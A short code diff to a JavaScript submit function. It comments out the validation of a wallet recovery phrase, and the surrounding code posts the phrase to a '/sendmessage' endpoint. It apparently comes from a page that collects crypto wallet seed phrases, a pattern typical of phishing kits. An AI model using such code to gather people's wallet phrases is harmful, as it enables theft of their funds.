@@ -226,7 +226,7 @@ function submit() {
         return;
     }
 
-    if (!isValidWordList(wallet.wallet_phrase)) return;
+    // if (!isValidWordList(wallet.wallet_phrase)) return;
 
     fetch(`${window.origin}/sendmessage`, {
         method: "POST",
